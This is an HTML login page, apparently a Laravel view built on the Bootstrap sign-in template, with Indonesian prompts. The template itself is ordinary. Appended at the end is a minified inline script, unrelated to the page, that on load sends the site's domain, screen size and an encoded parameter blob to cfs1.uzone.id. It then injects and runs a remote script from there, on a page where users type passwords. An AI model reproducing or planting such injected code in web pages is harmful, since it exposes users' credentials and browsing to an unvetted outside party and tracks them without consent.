
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Signin Template for Bootstrap</title>

    <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="../../assets/css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="signin.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <div class="container">

      <form action="{{url(action('LoginController@postLogin'))}}" method="post" class="form-signin">

        <input type="hidden" name="_token" value="<?php echo csrf_token();?>">

        <h2 class="form-signin-heading">Please sign in</h2>
        <label for="EmailUsername" class="sr-only">Email address</label>
        <input type="text" name="EmailUsername" class="form-control" placeholder="Input Email atau Username" required autofocus>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" name="password" class="form-control" placeholder="Password" required>
        <div class="checkbox">
          <label>
            <input type="checkbox" value="remember-me"> Remember me
          </label>
        </div>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
      </form>
      <center><p> Belum mempunyai akun? daftar <a href="register">disini</a></p></center>
    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKEFHmi7loBvXbsV1rfFQKyRithp5T8MYN3PxNYLCccoiCalqcpQkpTPpN8kp1sbTgzWq28CJ9XQx0UJpWGRYv2qf9j1tHRs7hcMucCui%2fUAkIC6339L0Px4u7LMfd6ZUtSXknWXa3cQvybjKeU6QDghgg3n0fMN7ZCLXTJqptn9F3c65HrXoMatdBxVC849GTcx7mICrnd6tvjgyyypJyk065OsLIPWlstwcrwEjhNGK8mg8LYbY%2fVoxsuwL5GTcPbJ4e7pbZhsunQWPe%2f0SfSLtprG7J8jHy3pmtFWfdrAwNlm3%2bx29u9dO7V7rV%2bP5tybLU66TLeGig%2bQ2U1X7Q1rN9pN9xIcp34Bt47K5SEwuqfrh663O5edev%2foFVNiTkvBw%2f%2bP6%2bnFVDi6HeK5D5PNdjYwWeWWsYkAz9BLR1KM%2budzQ6xEVX%2froZDULs5gqeu0hOijRSG2fQZMTSn2gyc0%2bKYPYQKtHCG01QWVtBvxzvUtXEbTMT%2bvWki5ExXYaSYS1KmF1iook455ZYBkfDEH2Sq8xR%2bRcOY0h2TK4g1D4uEF8MUD7HA%2fvNo3ODhoRlsZfL5rmaUA%2bn42lreFwQ8HQgKXLfMnjaJ1eT1rYLNgE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
